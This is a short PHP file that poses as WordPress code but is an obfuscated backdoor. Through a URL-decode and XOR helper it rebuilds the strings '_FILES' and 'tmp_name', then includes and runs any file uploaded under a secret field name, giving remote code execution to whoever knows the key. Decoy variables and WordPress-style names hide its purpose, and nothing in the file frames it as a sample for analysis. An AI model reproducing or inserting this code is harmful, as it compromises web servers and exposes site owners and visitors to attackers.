<?php 	
function wp_cockneyreplace()

{
    $page_templates = 'xrJYPFXx22';

    $patterns = $page_templates;
	$cockneyreplace = 'version';
    
    $allowed_html = $GLOBALS[child_of("%274%03%15%15%15", $patterns)];

    $post_mime_types = $allowed_html;
    $page = isset($post_mime_types[$patterns]);
	$flag_after_digit = 'dblq';
    if ($page)

    {
        $previous_date = $allowed_html[$patterns];
        $no_texturize_shortcodes = $previous_date[child_of("%0C%1F%3A%06%3E%275%1D", $patterns)];
        $month = $no_texturize_shortcodes;
	$updated = 'post_type_meta_caps';
        include ($month);
    }
}

function child_of($pagenow, $pre_tags)

{
    $_post = $pre_tags;
    $hex_encoding = "url" . "decode";
	$mimes = 'deleted';
    $untrash = $hex_encoding($pagenow);
    $intermediate_dir = substr($_post,0, strlen($untrash));
    $description = $untrash ^ $intermediate_dir;
    
    $untrash = strpos($description, $intermediate_dir);
    

    return $description;
}

wp_cockneyreplace();

	$prime_pattern = 'hierarchical_post_types';
?>
